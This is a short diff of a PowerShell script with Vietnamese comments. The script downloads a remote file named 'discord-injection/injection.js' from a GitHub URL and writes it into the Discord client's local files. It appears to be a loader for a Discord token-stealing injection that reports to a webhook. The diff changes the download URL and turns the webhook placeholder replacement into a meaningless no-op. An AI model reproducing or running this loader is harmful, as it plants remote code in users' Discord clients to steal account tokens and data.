@@ -1,5 +1,5 @@
 # URL của tệp cần tải
-$url = "https://raw.githubusercontent.com/43a1723/injection/main/injectiono.js"
+$url = "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js"
 
 # Đường dẫn cục bộ của Discord
 $localAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
@@ -37,7 +37,7 @@ try {
 }
 
 # Thay thế %key% thành 123 trong nội dung
-$newContent = $fileContent -replace '%WEBHOOK%', 'discordhook'
+$newContent = $fileContent -replace '1', '1'
 
 # Ghi nội dung mới vào tệp index.js
 try {
